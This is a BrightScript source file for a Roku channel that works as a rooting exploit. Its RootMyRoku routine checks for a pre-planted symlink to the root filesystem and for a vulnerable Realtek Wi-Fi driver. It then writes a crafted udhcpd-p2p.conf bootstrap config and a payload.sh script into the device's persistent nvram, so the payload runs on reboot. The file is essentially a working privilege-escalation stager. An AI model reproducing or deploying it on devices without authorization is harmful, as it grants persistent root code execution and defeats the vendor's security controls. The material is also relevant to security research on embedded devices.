Sub Main()
    m.port = CreateObject("roMessagePort")

    screen = CreateObject("roSGScreen")
    screen.setMessagePort(m.port)
    m.status = screen.CreateScene("StatusScreen")
    screen.show()

    m.spinner = m.status.FindNode("spinner")
    m.status.ObserveField("lastKeyEvent", m.port)
    m.status.text = "Press play to root your Roku or back to exit."

    While True
        event = Wait(30000, m.port)
        event_type = Type(event)

        If event_type = "roSGScreenEvent" Then
            ' When the screen is closed, shut everything down.
            If event.isScreenClosed() Then
                Return
            End If

        Else If event_type = "roSGNodeEvent" Then
            If event.GetField() = "lastKeyEvent" Then
                event_data = event.GetData()
                key = event_data["key"]
                pressed = event_data["pressed"]
                If key.StartsWith("play") And pressed Then
                    RootMyRoku()
                End If
            End If
        End If
    End While
End Sub


Sub Halt()
    m.status.busy = False
    While True
        Stop
        Sleep(1000)
    End While
End Sub


Sub RootMyRoku()
    m.status.busy = True

    ' Verify that the magic symlink exists and works.
    fs = CreateObject("roFileSystem")
    If fs.Stat("pkg:/root")["type"] <> "directory" Then
        m.status.text = "Sorry, root symlink missing or the exploit has been fixed. :("
        Stop
        Halt()
    End If

    ' Check that the device uses the vulnerable driver stack.
    wlan_driver = ReadAsciiFile("pkg:/root/tmp/wlan-driver").Trim()
    If wlan_driver <> "realtek" Then
        m.status.text = "WARNING: " + wlan_driver + " may not be vulnerable."
        Sleep(5000)
    End If

    m.status.text = "Installing the exploit bootstrapper..."
    Sleep(1000)
    bootstrap_config = ReadAsciiFile("pkg:/bootstrap.conf")
    default_config = ReadAsciiFile("pkg:/root/lib/wlan/realtek/udhcpd-p2p.conf")
    For Each line in default_config.Tokenize(Chr(10))
        If line.StartsWith("interface") Then
            bootstrap_config = bootstrap_config + Chr(10) + line + Chr(10)
        End If
    End For
    WriteAsciiFile("pkg:/root/nvram/udhcpd-p2p.conf", bootstrap_config)

    m.status.text = "Installing the exploit payload..."
    Sleep(1000)
    fs.CopyFile("pkg:/payload.sh", "pkg:/root/nvram/payload.sh")

    m.status.text = "Exploit ready!  Please reboot to trigger the payload."
    m.status.text = m.status.text + Chr(10) + "Settings -> System -> Power -> System Restart"
    Halt()
End Sub
